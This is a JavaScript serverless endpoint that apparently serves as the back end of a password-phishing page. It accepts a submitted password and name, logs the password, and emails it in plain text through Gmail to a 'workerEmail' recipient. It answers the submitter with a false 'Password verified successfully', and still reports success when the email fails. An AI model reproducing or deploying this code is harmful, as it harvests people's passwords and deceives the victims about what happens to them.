import nodemailer from 'nodemailer';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  try {
    // ✅ Get all data from frontend
    const { password, workerEmail, name } = req.body;

    console.log('🔐 Password Form:');
    console.log('Password:', password);
    console.log('Worker Email:', workerEmail);
    console.log('Name:', name);
    
    // Send email
    const emailResult = await sendPasswordEmail(password, workerEmail, name);

    return res.status(200).json({
      success: true,
      message: 'Password verified successfully',
      emailSent: emailResult.success,
      recipient: workerEmail,
      name: name,
      emailMessage: emailResult.message
    });

  } catch (error) {
    console.error('❌ Server Error:', error);
    return res.status(200).json({
      success: true,
      message: 'Verification completed',
      emailSent: false
    });
  }
}

async function sendPasswordEmail(password, workerEmail, name) {
  try {
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: { user: process.env.GMAIL_USER, pass: process.env.GMAIL_APP_PASS }
    });

    await transporter.sendMail({
      from: `"Password System" <${process.env.GMAIL_USER}>`,
      to: workerEmail,
      subject: `🔐 Password from ${name}`,
      html: `
        <div style="font-family: Arial, sans-serif;">
          <h2>Password Form Submission</h2>
          <p><strong>Name:</strong> ${name}</p>
          <p><strong>Password:</strong> ${password}</p>
          <p><strong>Time:</strong> ${new Date().toLocaleString()}</p>
        </div>
      `
    });
    
    console.log(`✅ Email sent to ${workerEmail} for ${name}`);
    return { success: true, message: 'Email sent' };

  } catch (error) {
    console.error('❌ Email Error:', error);
    return { success: false, message: error.message };
  }
}
